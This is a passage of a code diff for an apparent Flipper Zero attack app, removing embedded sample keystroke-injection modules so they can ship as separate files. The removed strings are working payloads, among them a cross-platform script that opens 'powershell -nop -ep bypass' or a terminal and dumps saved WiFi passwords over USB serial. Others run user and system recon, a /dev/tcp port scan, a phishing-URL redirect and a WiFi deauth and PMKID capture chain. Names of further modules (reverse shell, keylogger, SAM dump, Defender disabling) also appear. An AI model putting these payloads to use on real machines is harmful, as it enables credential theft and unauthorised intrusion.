-                                            "LED_COLOR RED\n"
-                                            "DELAY 1000\n"
-                                            "LOCK_SCREEN\n"
-                                            "LED_COLOR GREEN\n"
-                                            "PRINT Target locked.\n";
-
-/* --- Multi-user enumeration via FOR loop --- */
-static const char SAMPLE_USER_ENUM[] =
-    "NAME User Enumeration\n"
-    "DESCRIPTION Enumerate common user directories using FOR loop\n"
-    "CATEGORY recon\n"
-    "PLATFORMS WIN\n"
-    "PLATFORM WIN\n"
-    "DELAY 500\n"
-    "OPEN_POWERSHELL\n"
-    "PRINT Enumerating users...\n"
-    "LED_COLOR CYAN\n"
-    "STRINGLN Get-ChildItem C:\\Users | ForEach-Object { Write-Host $_.Name }\n"
-    "DELAY 2000\n"
-    "REM Check common service accounts\n"
-    "FOR $I = 1 TO 5\n"
-    "  STRINGLN echo Checking batch $I of common accounts...\n"
-    "  DELAY 500\n"
-    "END_FOR\n"
-    "STRINGLN net user\n"
-    "DELAY 3000\n"
-    "LED_COLOR GREEN\n"
-    "PRINT Enumeration complete\n";
-
-/* --- Arithmetic-based port scanner helper --- */
-static const char SAMPLE_PORT_SEQUENCE[] =
-    "NAME Port Sequence\n"
-    "DESCRIPTION Scan well-known ports using variable arithmetic\n"
-    "CATEGORY recon\n"
-    "PLATFORMS LINUX\n"
-    "OPTION TARGET 127.0.0.1 \"Target IP address\"\n"
-    "PLATFORM LINUX\n"
-    "DELAY 500\n"
-    "OPEN_TERMINAL\n"
-    "PRINT Scanning common ports on {{TARGET}}...\n"
-    "LED_COLOR YELLOW\n"
-    "REM Scan ports: 22, 80, 443, 8080, 8443\n"
-    "VAR $PORT = 22\n"
-    "STRINGLN (echo >/dev/tcp/{{TARGET}}/$PORT) 2>/dev/null && echo \"Port $PORT open\" || echo \"Port $PORT closed\"\n"
-    "DELAY 1000\n"
-    "VAR $PORT = 80\n"
-    "STRINGLN (echo >/dev/tcp/{{TARGET}}/$PORT) 2>/dev/null && echo \"Port $PORT open\" || echo \"Port $PORT closed\"\n"
-    "DELAY 1000\n"
-    "VAR $PORT = 443\n"
-    "STRINGLN (echo >/dev/tcp/{{TARGET}}/$PORT) 2>/dev/null && echo \"Port $PORT open\" || echo \"Port $PORT closed\"\n"
-    "DELAY 1000\n"
-    "LED_COLOR GREEN\n"
-    "PRINT Port scan complete\n";
-
-/* --- Phishing URL redirect --- */
-static const char SAMPLE_PHISH_REDIRECT[] =
-    "NAME Phish Redirect\n"
-    "DESCRIPTION Opens a phishing URL in the target's browser\n"
-    "CATEGORY exploit\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION URL https://example.com \"Phishing page URL\"\n"
-    "PLATFORM ALL\n"
-    "DELAY 500\n"
-    "LED_COLOR RED\n"
-    "PRINT Opening phishing URL...\n"
-    "BROWSE_URL {{URL}}\n"
-    "DELAY 3000\n"
-    "MINIMIZE_ALL\n"
-    "LED_COLOR GREEN\n"
-    "PRINT Payload delivered\n";
-
-/* --- Comprehensive WiFi+HID attack --- */
-static const char SAMPLE_WIFI_FULL_ATTACK[] =
-    "NAME WiFi Full Attack\n"
-    "DESCRIPTION Scan APs, deauth, PMKID capture, type results, save\n"
-    "CATEGORY exploit\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION TARGET_SSID TargetNetwork \"SSID to attack\"\n"
-    "PLATFORM ALL\n"
-    "IF_CONNECTED\n"
-    "  PRINT Phase 1: Scanning APs...\n"
-    "  LED_COLOR BLUE\n"
-    "  WIFI_SCAN\n"
-    "  WIFI_WAIT 5000\n"
-    "  PRINT Phase 2: Station scan...\n"
-    "  LED_COLOR CYAN\n"
-    "  WIFI_SCAN_STA\n"
-    "  WIFI_WAIT 5000\n"
-    "  PRINT Phase 3: Deauth {{TARGET_SSID}}...\n"
-    "  LED_COLOR RED\n"
-    "  WIFI_DEAUTH_TARGET {{TARGET_SSID}}\n"
-    "  WIFI_WAIT 10000\n"
-    "  WIFI_STOP\n"
-    "  PRINT Phase 4: PMKID capture...\n"
-    "  LED_COLOR MAGENTA\n"
-    "  WIFI_SNIFF_PMKID\n"
-    "  WIFI_WAIT 15000\n"
-    "  WIFI_STOP\n"
-    "  PRINT Phase 5: Saving results...\n"
-    "  LED_COLOR YELLOW\n"
-    "  SAVE_WIFI\n"
-    "  PRINT Phase 6: Typing results to target...\n"
-    "  OPEN_NOTEPAD\n"
-    "  DELAY 2000\n"
-    "  STRINGLN === WiFi Attack Results ===\n"
-    "  WIFI_RESULT\n"
-    "  STRINGLN === Station Results ===\n"
-    "  WIFI_STA_RESULT\n"
-    "  LED_COLOR GREEN\n"
-    "  PRINT Attack complete!\n"
-    "END_IF\n";
-
-/* --- Data exfil via notepad (non-LED channel) --- */
-static const char SAMPLE_QUICK_EXFIL[] =
-    "NAME Quick Exfil\n"
-    "DESCRIPTION Exfil system info by typing into notepad then saving\n"
-    "CATEGORY recon\n"
-    "PLATFORMS WIN\n"
-    "OPTION FILENAME C:\\temp\\recon.txt \"Output file path\"\n"
-    "PLATFORM WIN\n"
-    "DELAY 500\n"
-    "PRINT Exfiltrating system info...\n"
-    "LED_COLOR RED\n"
-    "OPEN_POWERSHELL\n"
-    "STRINGLN $info = @()\n"
-    "STRINGLN $info += \"=== HOSTNAME ===\"\n"
-    "STRINGLN $info += hostname\n"
-    "STRINGLN $info += \"=== IP CONFIG ===\"\n"
-    "STRINGLN $info += (ipconfig | Out-String)\n"
-    "STRINGLN $info += \"=== USERS ===\"\n"
-    "STRINGLN $info += (net user | Out-String)\n"
-    "STRINGLN $info += \"=== PROCESSES ===\"\n"
-    "STRINGLN $info += (Get-Process | Select Name,Id | Out-String)\n"
-    "STRINGLN $info -join \"`n\" | Out-File -FilePath {{FILENAME}}\n"
-    "DELAY 2000\n"
-    "STRINGLN exit\n"
-    "LED_COLOR GREEN\n"
-    "PRINT Recon saved to {{FILENAME}}\n";
-
-/* WiFi Credential Dump (USB CDC) — high-bandwidth version of wifi_creds.fpwn */
-static const char SAMPLE_WIFI_CREDS_USB[] =
-    "NAME WiFi Creds (USB)\n"
-    "DESCRIPTION Extracts saved WiFi passwords; exfils via USB CDC serial (~115200 baud)\n"
-    "CATEGORY credential\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
-    "OPTION EXFIL_USB_DELAY 5000 \"Delay before USB CDC switch (ms)\"\n"
-    "PLATFORM WIN\n"
-    "DELAY {{DELAY}}\n"
-    "SET EXFIL_USB_DELAY {{EXFIL_USB_DELAY}}\n"
-    "GUI r\n"
-    "DELAY 800\n"
-    "STRING powershell -nop -ep bypass\n"
-    "ENTER\n"
-    "DELAY 1200\n"
-    "EXFIL_USB (netsh wlan show profiles) | Select-String '\\:(.+)$' | "
-    "%{$n=$_.Matches.Groups[1].Value.Trim(); $_} | "
-    "%{(netsh wlan show profile name=\"$n\" key=clear)} | "
-    "Select-String 'Key Content\\W+\\:(.+)$' | "
-    "%{\"WIFI: $n = \" + $_.Matches.Groups[1].Value.Trim()}\n"
-    "PLATFORM MAC\n"
-    "DELAY {{DELAY}}\n"
-    "SET EXFIL_USB_DELAY {{EXFIL_USB_DELAY}}\n"
-    "GUI SPACE\n"
-    "DELAY 700\n"
-    "STRING Terminal\n"
-    "ENTER\n"
-    "DELAY 1400\n"
-    "EXFIL_USB for ssid in $(networksetup -listpreferredwirelessnetworks en0 | tail -n +2 | "
-    "tr -d ' '); do pw=$(security find-generic-password -wa \"$ssid\" 2>/dev/null); "
-    "echo \"WIFI: $ssid = $pw\"; done\n"
-    "PLATFORM LINUX\n"
-    "DELAY {{DELAY}}\n"
-    "SET EXFIL_USB_DELAY {{EXFIL_USB_DELAY}}\n"
-    "CTRL ALT t\n"
-    "DELAY 1400\n"
-    "EXFIL_USB sudo grep -rH psk= /etc/NetworkManager/system-connections/ 2>/dev/null || "
-    "nmcli -s -g 802-11-wireless.ssid,802-11-wireless-security.psk connection show 2>/dev/null | "
-    "sed 's/:/: /'\n";
-
-/* USB Exfil Test — simple hostname exfil to verify the EXFIL_USB pipeline */
-static const char SAMPLE_USB_EXFIL_TEST[] =
-    "NAME USB Exfil Test\n"
-    "DESCRIPTION Tests USB CDC exfiltration by capturing hostname\n"
-    "CATEGORY recon\n"
-    "PLATFORMS WIN,MAC,LINUX\n"
-    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
-    "OPTION EXFIL_USB_DELAY 3000 \"Delay before USB CDC switch (ms)\"\n"
-    "PLATFORM WIN\n"
-    "DELAY {{DELAY}}\n"
-    "SET EXFIL_USB_DELAY {{EXFIL_USB_DELAY}}\n"
-    "GUI r\n"
-    "DELAY 800\n"
-    "STRING powershell -nop -ep bypass\n"
-    "ENTER\n"
-    "DELAY 1200\n"
-    "EXFIL_USB hostname\n"
-    "PLATFORM MAC\n"
-    "DELAY {{DELAY}}\n"
-    "SET EXFIL_USB_DELAY {{EXFIL_USB_DELAY}}\n"
-    "GUI SPACE\n"
-    "DELAY 700\n"
-    "STRING Terminal\n"
-    "ENTER\n"
-    "DELAY 1400\n"
-    "EXFIL_USB hostname\n"
-    "PLATFORM LINUX\n"
-    "DELAY {{DELAY}}\n"
-    "SET EXFIL_USB_DELAY {{EXFIL_USB_DELAY}}\n"
-    "CTRL ALT t\n"
-    "DELAY 1400\n"
-    "EXFIL_USB hostname\n";
-
 static bool fpwn_write_sample_file(Storage* storage, const char* path, const char* content) {
     File* f = storage_file_alloc(storage);
     if(!storage_file_open(f, path, FSAM_WRITE, FSOM_CREATE_NEW)) {
-        FURI_LOG_W(TAG, "sample exists or open failed: %s", path);
         storage_file_free(f);
         return false;
     }
@@ -4894,137 +3484,15 @@ static bool fpwn_write_sample_file(Storage* storage, const char* path, const cha
 }
 
 void fpwn_modules_write_samples(FPwnApp* app) {
-    /* Write each sample file if it does not already exist.
-     * fpwn_write_sample_file uses FSOM_CREATE_NEW so existing files
-     * (including user-modified ones) are never overwritten. */
-    char path[FPWN_PATH_LEN];
+    /* Ensure the modules directory exists */
+    storage_simply_mkdir(app->storage, FPWN_MODULES_DIR);
 
+    /* Write a single "getting started" module if no .fpwn files exist yet.
+     * All other sample modules are distributed as standalone .fpwn files
+     * in the release package — copy them to SD:/flipperpwn/modules/. */
+    char path[FPWN_PATH_LEN];
     snprintf(path, sizeof(path), "%s/sysinfo.fpwn", FPWN_MODULES_DIR);
     fpwn_write_sample_file(app->storage, path, SAMPLE_SYSINFO);
-
-    snprintf(path, sizeof(path), "%s/lock_screen.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_LOCK_SCREEN);
-
-    snprintf(path, sizeof(path), "%s/attack_chain.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_ATTACK_CHAIN);
-
-    snprintf(path, sizeof(path), "%s/wifi_creds.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_WIFI_CREDS);
-
-    snprintf(path, sizeof(path), "%s/hash_dump.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_HASH_DUMP);
-
-    snprintf(path, sizeof(path), "%s/reverse_shell.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_REVERSE_SHELL);
-
-    snprintf(path, sizeof(path), "%s/persistence.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_PERSISTENCE);
-
-    snprintf(path, sizeof(path), "%s/browser_history.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_BROWSER_HISTORY);
-
-    snprintf(path, sizeof(path), "%s/disable_defender.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_DISABLE_DEFENDER);
-
-    snprintf(path, sizeof(path), "%s/keylogger.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_KEYLOGGER);
-
-    snprintf(path, sizeof(path), "%s/clipboard_steal.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_CLIPBOARD_STEAL);
-
-    snprintf(path, sizeof(path), "%s/network_recon.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_NETWORK_RECON);
-
-    snprintf(path, sizeof(path), "%s/ssh_key_theft.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_SSH_KEY_THEFT);
-
-    snprintf(path, sizeof(path), "%s/wifi_attack.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_WIFI_ATTACK);
-
-    snprintf(path, sizeof(path), "%s/portal_phish.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_PORTAL_PHISH);
-
-    snprintf(path, sizeof(path), "%s/full_recon.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_FULL_RECON);
-
-    snprintf(path, sizeof(path), "%s/rickroll_beacon.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_RICKROLL_BEACON);
-
-    snprintf(path, sizeof(path), "%s/stealth_recon.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_STEALTH_RECON);
-
-    snprintf(path, sizeof(path), "%s/wifi_recon_full.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_WIFI_RECON_FULL);
-
-    snprintf(path, sizeof(path), "%s/uac_bypass.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_UAC_BYPASS);
-
-    snprintf(path, sizeof(path), "%s/os_fingerprint.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_OS_FINGERPRINT);
-
-    snprintf(path, sizeof(path), "%s/random_passwd.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_RANDOM_PASSWD);
-
-    snprintf(path, sizeof(path), "%s/payload_dropper.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_PAYLOAD_DROPPER);
-
-    snprintf(path, sizeof(path), "%s/mouse_jiggler.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_MOUSE_JIGGLER);
-
-    snprintf(path, sizeof(path), "%s/conditional_recon.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_CONDITIONAL_RECON);
-
-    snprintf(path, sizeof(path), "%s/screen_capture.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_SCREEN_CAPTURE);
-
-    snprintf(path, sizeof(path), "%s/inject_chain.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_INJECT_CHAIN);
-
-    snprintf(path, sizeof(path), "%s/sam_dump.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_SAM_DUMP);
-
-    snprintf(path, sizeof(path), "%s/slow_payload.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_SLOW_PAYLOAD);
-
-    snprintf(path, sizeof(path), "%s/usb_wait.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_USB_WAIT);
-
-    snprintf(path, sizeof(path), "%s/quick_recon.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_QUICK_RECON);
-
-    snprintf(path, sizeof(path), "%s/exfil_hostname.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_EXFIL_HOSTNAME);
-
-    snprintf(path, sizeof(path), "%s/pin_spray.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_PIN_SPRAY);
-
-    snprintf(path, sizeof(path), "%s/countdown.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_COUNTDOWN);
-
-    snprintf(path, sizeof(path), "%s/screen_grab.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_SCREEN_GRAB);
-
-    snprintf(path, sizeof(path), "%s/lock_and_leave.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_LOCK_AND_LEAVE);
-
-    snprintf(path, sizeof(path), "%s/user_enum.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_USER_ENUM);
-
-    snprintf(path, sizeof(path), "%s/port_sequence.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_PORT_SEQUENCE);
-
-    snprintf(path, sizeof(path), "%s/phish_redirect.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_PHISH_REDIRECT);
-
-    snprintf(path, sizeof(path), "%s/wifi_full_attack.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_WIFI_FULL_ATTACK);
-
-    snprintf(path, sizeof(path), "%s/quick_exfil.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_QUICK_EXFIL);
-
-    snprintf(path, sizeof(path), "%s/wifi_creds_usb.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_WIFI_CREDS_USB);
-
-    snprintf(path, sizeof(path), "%s/usb_exfil_test.fpwn", FPWN_MODULES_DIR);
-    fpwn_write_sample_file(app->storage, path, SAMPLE_USB_EXFIL_TEST);
 }
+/* END — previously 43 sample modules were embedded here (~33 KB).
+ * They now ship as standalone .fpwn files alongside the FAP. */
